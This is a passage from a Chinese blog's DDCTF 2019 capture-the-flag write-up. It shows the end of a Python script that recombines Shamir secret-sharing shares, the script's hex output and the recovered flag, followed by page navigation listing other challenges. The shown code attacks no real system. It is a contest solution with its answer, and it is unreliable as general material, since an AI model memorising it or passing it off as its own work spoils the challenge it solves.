class="number">0xBFCFBAD74A23B3CC14AF1736C790A7BC11CD08141FB805BCD9227A6E9109A83924ADEEDBC343464D42663AB5087AE26444A1E42B688A8ADCD7CF2BA7F75CD89D</span>)</span><br><span class="line">    b3=(<span class="number">3</span>,<span class="number">0x9D3D3DBDDA2445D0FE8C6DFBB84C2C30947029E912D7FB183C425C645A85041419B89E25DD8492826BD709A0A494BE36CEF44ADE376317E7A0C70633E3091A61</span>)</span><br><span class="line">    b4=(<span class="number">4</span>,<span class="number">0x79F9F4454E84F32535AA25B8988C77283E4ECF72795014286707982E57E46004B946E42FB4BE9D22697393FC7A6C33A27CE0D8BFC990A494C12934D61D8A2BA8</span>)</span><br><span class="line">    b5=(<span class="number">5</span>,<span class="number">0x2A074DA35B3111F1B593F869093E5D5548CCBB8C0ADA0EBBA936733A21C513ECF36B83B7119A6F5BEC6F472444A3CE2368E5A6EBF96603B3CD10EAE858150510</span>)</span><br><span class="line">    shares=[a1,a2,a4,b3,b4,b5]</span><br><span class="line">    r1=recover_secret(shares[:<span class="number">3</span>],p)</span><br><span class="line">    r2=recover_secret(shares[<span class="number">-3</span>:],p)</span><br><span class="line">    print(hex(r1))</span><br><span class="line">    print(hex(r2))</span><br><span class="line">    r3=r1^r2</span><br><span class="line">    print(hex(r3))</span><br><span class="line">    c1=(<span class="number">1</span>,r1)</span><br><span class="line">    c2=(<span class="number">2</span>,r2)</span><br><span class="line">    shares=[c1,c2]</span><br><span class="line">    r4=recover_secret(shares,p)</span><br><span class="line">    print(hex(r4))</span><br><span class="line">    print(hex(r4)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
<p>得到答案：</p>
<blockquote>
<p>0x5f9fa97581c7b20f16c60d61cf3973bc308f5014756e7e6679dfc1b1931e4ab9853f962def6eefe68fb3fba2263d5cd1b4c13ebf08a5efcd2a3db8bf65aeb401L<br>0xbf3f52eb038f641e2d8c1ac39e72e778611ea028eadcfcccf37b3f1fd1f619fcc44cf9f36f719997b6fbc1d31c234c3123284812b71a9b57f02422377bfafc85L<br>0xe0a0fb9e8248d6113b4a17a2514b94c45191f03c9fb282aa8aa4feae42e8534541736fde801f767139483a713a1e10e097e976adbfbf749ada199a881e544884L<br>0x44444354467b76463232686f6c4635686c357130576d72465a356b5a31444264574f474f626b7dL<br>DDCTF{vF22holF5hl5q0WmrFZ5kZ1DBdWOGObk}</p>
</blockquote>
</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://microvorld.com">damn1t</a></p><p> <span>Link:  </span><a href="http://microvorld.com/2019/04/21/CTF/ddctf2019/">http://microvorld.com/2019/04/21/CTF/ddctf2019/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/04/21/CTF/plaidctf2019/" title="plaidctf2019"><span>< PreviousPost</span><br><span class="prevTitle">plaidctf2019</span></a><a class="nextSlogan" href="/2019/04/20/python/upgrade python3/" title="Ubuntu升级python3.7"><span>NextPost ></span><br><span class="nextTitle">Ubuntu升级python3.7</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DDCTF2019"><span class="toc-number">1.</span> <span class="toc-text">DDCTF2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#滴"><span class="toc-number">1.1.1.</span> <span class="toc-text">滴~</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB-签到题"><span class="toc-number">1.1.2.</span> <span class="toc-text">WEB 签到题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Upload-IMG"><span class="toc-number">1.1.3.</span> <span class="toc-text">Upload-IMG</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#homebrew-event-loop"><span class="toc-number">1.1.4.</span> <span class="toc-text">homebrew event loop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#大吉大利，今晚吃鸡"><span class="toc-number">1.1.5.</span> <span class="toc-text">大吉大利，今晚吃鸡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql弱口令"><span class="toc-number">1.1.6.</span> <span class="toc-text">mysql弱口令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">1.2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#北京地铁"><span class="toc-number">1.2.1.</span> <span class="toc-text">北京地铁</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#lsb"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">lsb</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rgb"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">rgb</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wireshark"><span class="toc-number">1.3.</span> <span class="toc-text">wireshark</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MulTzor"><span class="toc-number">1.4.</span> <span class="toc-text">MulTzor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#联盟决策大会"><span class="toc-number">1.5.</span> <span class="toc-text">联盟决策大会</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>